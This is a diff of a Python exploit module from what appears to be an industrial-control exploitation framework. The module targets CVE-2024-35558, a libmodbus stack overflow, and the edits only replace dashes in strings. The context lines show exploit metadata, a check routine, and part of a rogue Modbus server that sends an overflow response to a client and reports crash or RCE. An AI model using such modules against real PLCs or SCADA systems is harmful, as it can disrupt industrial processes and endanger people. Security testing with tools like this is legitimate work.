@@ -1,4 +1,4 @@
-"""IXF ICS CVE Module — CVE-2024-35558 (libmodbus < 3.1.10 Stack Overflow).
+"""IXF ICS CVE Module - CVE-2024-35558 (libmodbus < 3.1.10 Stack Overflow).
 
 Stack-based buffer overflow in libmodbus library versions prior to 3.1.10.
 A malformed Modbus TCP response triggers the overflow in the Modbus client,
@@ -20,7 +20,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "CVE-2024-35558 — libmodbus Stack Buffer Overflow",
+        "name":             "CVE-2024-35558 - libmodbus Stack Buffer Overflow",
         "description":      "Stack overflow in libmodbus < 3.1.10 triggered by a malformed Modbus TCP response. Affects embedded devices, SCADA systems, and PLCs using libmodbus for client communication.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -33,7 +33,7 @@ class Exploit(Exploit):
             "Industrial gateways with Modbus client",
         ),
         "impact":           "CRITICAL",
-        "exploit_type":     "Stack Buffer Overflow — Client-side RCE",
+        "exploit_type":     "Stack Buffer Overflow - Client-side RCE",
         "cve":              "CVE-2024-35558",
         "cvss":             "9.8",
         "severity":         "CRITICAL",
@@ -44,14 +44,14 @@ class Exploit(Exploit):
 
     target      = OptIP("", "Target IP (client connecting to this Modbus server)")
     port        = OptPort(502, "Modbus TCP port (default 502)")
-    simulate    = OptBool(False, "Simulate — describe exploit without starting listener")
-    destructive = OptBool(False, "Enable live exploitation — requires authorization")
+    simulate    = OptBool(False, "Simulate - describe exploit without starting listener")
+    destructive = OptBool(False, "Enable live exploitation - requires authorization")
 
     @mute
     def check(self):
         if not self.target:
             return False
-        # This is a server-side module — check if target has libmodbus-based client
+        # This is a server-side module - check if target has libmodbus-based client
         # by scanning for Modbus TCP client connections
         try:
             s = socket.socket()
@@ -70,7 +70,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2024-35558 — libmodbus Stack Buffer Overflow\n"
+                    "CVE-2024-35558 - libmodbus Stack Buffer Overflow\n"
                     "CVSS 9.8 (CRITICAL) | CWE-121 Stack Overflow\n\n"
                     "Attack Model (client-side vulnerability):\n"
                     "  - Attacker controls a Modbus TCP server (or MITM position)\n"
@@ -129,14 +129,14 @@ class Exploit(Exploit):
                 try:
                     client_resp = conn.recv(32)
                     if not client_resp:
-                        print_success("[CVE-2024-35558] Client disconnected after overflow — crash/RCE likely triggered!")
+                        print_success("[CVE-2024-35558] Client disconnected after overflow - crash/RCE likely triggered!")
                     else:
                         print_info(f"[CVE-2024-35558] Client still alive: {client_resp.hex()[:32]}")
                 except Exception:
-                    print_success("[CVE-2024-35558] Client connection lost after overflow — exploitation indicator")
+                    print_success("[CVE-2024-35558] Client connection lost after overflow - exploitation indicator")
             conn.close()
         except TimeoutError:
-            print_warning("[CVE-2024-35558] No client connected within 30s — ensure target uses libmodbus < 3.1.10 as client")
+            print_warning("[CVE-2024-35558] No client connected within 30s - ensure target uses libmodbus < 3.1.10 as client")
         except Exception as exc:
             print_error(f"[CVE-2024-35558] Error: {exc}")
         finally:
